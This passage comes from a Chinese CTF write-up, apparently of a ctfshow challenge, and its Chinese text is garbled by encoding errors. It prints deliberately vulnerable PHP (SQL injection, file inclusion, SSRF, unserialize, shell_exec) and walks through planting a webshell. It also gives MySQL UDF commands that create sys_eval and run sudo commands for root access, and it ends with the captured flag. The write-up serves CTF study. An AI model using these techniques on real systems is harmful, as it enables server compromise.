<span class="variable">$kDis</span> * <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$k</span> = <span class="title function_ invoke__">round</span>(<span class="variable">$kAvg</span> + <span class="variable">$r</span>);</span><br><span class="line">            <span class="variable">$total</span> -= <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$data</span>[] = <span class="variable">$k</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recoveryUsers</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ¢å¤æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]&lt;<span class="number">1024</span>*<span class="number">1024</span>)&#123;</span><br><span class="line"><span class="variable">$file_name</span>= <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_name</span>, DB_PATH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;æ•°æ®æ¢å¤å¤±è´¥ file_name&#x27;</span>.<span class="variable">$file_name</span>.<span class="string">&#x27; DB_PATH=&#x27;</span>.DB_PATH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;æ•°æ®æ¢å¤å¤±è´¥&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phpInfoTest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authKeyValidate</span>(<span class="params"><span class="variable">$auth</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="variable">$auth</span>==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>)?<span class="string">&#x27;éªŒè¯æˆåŠŸ&#x27;</span>:<span class="string">&#x27;éªŒè¯å¤±è´¥&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;status&#x27;</span>=&gt;<span class="variable">$auth</span>==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>)?<span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27;-1&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remoteUpdate</span>(<span class="params"><span class="variable">$auth</span>,<span class="variable">$address</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ›´æ–°å¤±è´¥&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>!==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;æƒé™keyéªŒè¯å¤±è´¥&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$address</span>);</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=(<span class="variable">$content</span>!==<span class="literal">false</span>?<span class="variable">$content</span>:<span class="string">&#x27;åœ°å€ä¸å¯è¾¾&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilString</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;372619038&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="variable">$key</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG647&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;you are not 372619038?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilClass</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$m</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable">$m</span>=<span class="variable">$m</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;<span class="variable">$m</span>=<span class="variable">$m</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="variable">$m</span>==<span class="variable">$m</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG647&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG648&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;mmmmm?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilNumber</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$number</span> = <span class="title function_ invoke__">getArray</span>(<span class="number">1000</span>,<span class="number">20</span>,<span class="number">10</span>,<span class="number">999</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$number</span>[<span class="variable">$m</span>]==<span class="variable">$m</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG648&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG649&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;number is right?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilFunction</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;ffffffff&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="variable">$key</span>)!==<span class="literal">FALSE</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG649&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG650&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;you are not ffffffff?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilArray</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$arrays</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arrays</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$arrays</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;ctfshow&#x27;</span>, <span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$arrays</span>)) &amp;&amp;  <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG650&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG651&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;array?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netTest</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;å‘½ä»¤æ‰§è¡Œå¤±è´¥&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z]+$/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ¨ä¸ªå»æ‰“å³å¯ï¼</p><p>è®°ç‚¹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>content = call<span class="built_in">_</span>user<span class="built_in">_</span>func(<span class="built_in">$</span>m);</span><br><span class="line">if(stripos(<span class="built_in">$</span>content, <span class="built_in">$</span>key)!==FALSE)&#123;</span><br><span class="line">echo shell<span class="built_in">_</span>exec(&#x27;cat /FLAG/FLAG647&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ‰“æ³•ï¼šgetenvå’Œsession_idï¼ˆè·å–å½“å‰çš„PHPSESSIDï¼‰</p><p>ä¸‹ä¸ªç¯èŠ‚ï¼</p><h3 id="page-php"><a href="#page-php" class="headerlink" title="&#x2F;page.php"></a>&#x2F;page.php</h3><p>åˆ©ç”¨ssrfæ‹¿æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-07-25 16:22:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-07-25 16:22:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="keyword">__DIR__</span>.DIRECTORY_SEPARATOR.<span class="string">&#x27;system36d/util/dbutil.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è½¬æ¢&#x27; &quot; \ æ¥å®ç°é˜²æ³¨å…¥</span></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = db::<span class="title function_ invoke__">get_username</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç‰µæ‰¯åˆ°&#x2F;system36&#x2F;util&#x2F;deutil.phpç»§ç»­æ‹¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$password</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$database</span> = <span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select `key` from ctfshow_keys&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res</span>) &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_username</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select `username` from ctfshow_users where id = (<span class="subst">$id</span>)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res</span>) &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_conn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$conn</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="built_in">self</span>::<span class="variable">$host</span>, <span class="built_in">self</span>::<span class="variable">$username</span>, <span class="built_in">self</span>::<span class="variable">$password</span>, <span class="built_in">self</span>::<span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$conn</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$conn</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªsqlæ³¨å…¥é—­åˆæ‹¬å·å°±å¯ä»¥æ‰“æ­£å¸¸æ³¨å…¥æ‹¿åˆ°keyå³å¯ï¼</p><p>ä¹‹å‰ä»¥ä¸º&#x2F;system36d&#x2F;util&#x2F; 403ä¸‹é¢çš„æ–‡ä»¶ä¹Ÿæ˜¯403ï¼Œç°åœ¨çœ‹æ¥å¹¶éï¼Œæ‰€ä»¥ç›´æ¥æ‰«å‡ºä¸ªcommon.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;dbutil.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯ GET å‚æ•° k æ˜¯å¦ç­‰äº FLAG651 çš„å†…å®¹</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>] !== <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG651&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;651flagæœªæ‹¿åˆ°&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯ POST å‚æ•°å­˜åœ¨ä¸”æ–‡ä»¶å­˜åœ¨ï¼ŒåŒæ—¶éªŒè¯ key ä¸æ•°æ®åº“ä¸­çš„ key ä¸€è‡´</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (db::<span class="title function_ invoke__">get_key</span>() == <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„å£å­ï¼Œç”¨æ¥åŒ…å«æˆ‘ä»¬çš„é©¬å§</p><p>æ³•ä¸€ï¼šsessionåŒ…å«ï¼Œphpinfoé‡Œé¢çœ‹äº†ä¸‹é…ç½®é¡¹å¼€äº†ï¼Œç›´æ¥å†™</p><p>æ³•äºŒï¼šä¹‹å‰init.phpé‡Œé¢çŸ¥é“äº†å¤‡ä»½æ–‡ä»¶çš„è·¯å¾„ï¼Œæˆ‘ä»¬åˆ©ç”¨æ¢å¤åŠŸèƒ½å¯ä»¥æ‰“</p><h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>æœ‰é©¬äº†ï¼Œç”¨èšå‰‘é“¾æ¥å‘—ï¼ä½†æ˜¯æƒé™å¤ªä½äº†ï¼Œææƒå’¯ï¼Œsuidä¸‹é¢æœ‰ä¸€ä¸ªä½†æ˜¯ç”¨ä¸äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥å¯èƒ½å’Œäº¤äº’æœ‰å…³å§ï¼è¿™é‡ŒçŸ¥é“æ•°æ®åº“å¯†ç æˆ‘ä»¬ç”¨udfææƒï¼(å…·ä½“æ€ä¹ˆæå¯ä»¥é—®æˆ‘)</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">#</span>ç”±äºæ•°æ®åº“é™åˆ¶äº†æ–‡ä»¶æ“ä½œçš„ç›®å½•ï¼Œæ‰€ä»¥åªèƒ½é…åˆcpå‘½ä»¤è¿›è¡Œæ“ä½œç›®å½•äº†</span><br><span class="line"><span class="params">#</span>å…ˆå†™ä¸€ä¸ªæ¶æ„çš„soåŠ¨æ€é“¾æ¥æ–‡ä»¶</span><br><span class="line"><span class="params">#</span>ç„¶åcpç§»åŠ¨åˆ°æ’ä»¶ç›®å½•/udf.so</span><br><span class="line"><span class="params">#</span>åˆ›å»ºæ¶æ„å‡½æ•°</span><br><span class="line">create function sys<span class="built_in">_</span>eval returns string soname &#x27;udf.so&#x27;;</span><br><span class="line"><span class="params">#</span> çœ‹çœ‹æˆåŠŸæ²¡</span><br><span class="line">select * from mysql.func where name = &#x27;sys<span class="built_in">_</span>eval&#x27;;</span><br><span class="line"><span class="params">#</span> æ‰§è¡Œå‘½ä»¤</span><br><span class="line">select sys<span class="built_in">_</span>eval(&#x27;sudo ls /root&#x27;);</span><br><span class="line">select sys<span class="built_in">_</span>eval(&#x27;sudo cat /root/you<span class="built_in">_</span>win&#x27;);</span><br><span class="line"></span><br><span class="line">ç¥è´ºä½ ï¼Œä½ å·²ç»å®Œå…¨æ§åˆ¶äº†è¿™å°æœåŠ¡å™¨ï¼Œä¸ºä½ ä¸€è·¯ä»¥æ¥çš„åšæŒå’ŒåŠªåŠ›ï¼Œç‚¹èµï¼</span><br><span class="line"></span><br><span class="line">                  çœŸä¸å®¹æ˜“å•Šï¼Œå¸ˆå‚…å¥½æ ·çš„ï¼</span><br><span class="line"></span><br><span class="line">ä¸è¿‡åˆ«é«˜å…´çš„å¤ªæ—©ï¼Œè¿™åªæ˜¯ç¬¬ä¸€å…³ï¼Œåé¢è¿˜æœ‰æ›´è‰°éš¾çš„æŒ‘æˆ˜ï¼Œä½ å‡†å¤‡å¥½äº†å—ï¼</span><br><span class="line"></span><br><span class="line">å¯¹äº†ï¼Œè¿™æ˜¯ç»™ä½ çš„flag </span><br><span class="line"></span><br><span class="line">flag<span class="built_in">_</span>654=ctfshow&#123;4ab2c2ccd0c3c35fdba418d8502f5da9&#125; </span><br><span class="line"></span><br><span class="line">                                   â€”â€”å¤§èœé¸¡ 2021å¹´8æœˆ2æ—¥02æ—¶12ï¿½</span><br><span 